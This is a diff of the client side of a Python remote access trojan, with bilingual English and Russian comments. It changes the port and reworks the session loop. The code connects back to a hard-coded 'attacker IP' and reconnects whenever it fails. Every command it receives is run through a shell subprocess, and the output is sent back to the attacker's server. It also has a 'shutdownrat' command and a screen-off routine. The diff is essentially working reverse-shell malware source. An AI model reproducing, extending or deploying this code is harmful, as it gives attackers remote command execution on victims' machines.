@@ -8,7 +8,7 @@ SEPARATOR = "<SEPARATOR>"
 # Attacker IP / Айпи атакующего
 HOST = '192.168.1.47'
 # Port to connect / Порт на который клиент будет подключатся
-PORT = 10099
+PORT = 10042
 
 s = socket.socket()
 
@@ -40,7 +40,7 @@ def main():
     except:
         sleep(5)
         s.connect((HOST, PORT))
-        session()
+
 
 def screenoff():
     if sys.platform.startswith('linux'):
@@ -68,7 +68,6 @@ def session():
     while True:
         data = s.recv(1024)
         cmd = str(data, encoding="utf-8", errors="ignore")
-        print(cmd)
 
         if cmd == 'shutdownrat':
             s.close()
@@ -100,19 +99,18 @@ def session():
             except Exception as ex:
                 s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))
 
-        # If length of command > 0, send to subprocess shell / Если длина команды > 0, посылаем ее в консоль subprocess
-        elif len(cmd) > 0:
-            try:
-                command = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
-                                           stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-                # Variable with subprocess output / Переменная с ответом от subprocess
-                output_byte = command.stdout.read() + command.stderr.read()
-                # Convert output_byte to string / Конвертируем output_byte в строку
-                output_str = str(output_byte, "utf-8", errors="ignore")
-                # Sending output_str to server / Отправляем output_str на сервер
+        else:
+            command = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
+                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            # Variable with subprocess output / Переменная с ответом от subprocess
+            output_byte = command.stdout.read() + command.stderr.read()
+            # Convert output_byte to string / Конвертируем output_byte в строку
+            output_str = str(output_byte, "utf-8", errors="ignore")
+            # Sending output_str to server / Отправляем output_str на сервер
+            if len(output_str) == 0:
+                s.send(" ".encode())
+            else:
                 s.send(bytes(output_str, encoding="utf-8", errors="ignore"))
-            except Exception as ex:
-                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))
 
 
 if __name__ == '__main__':
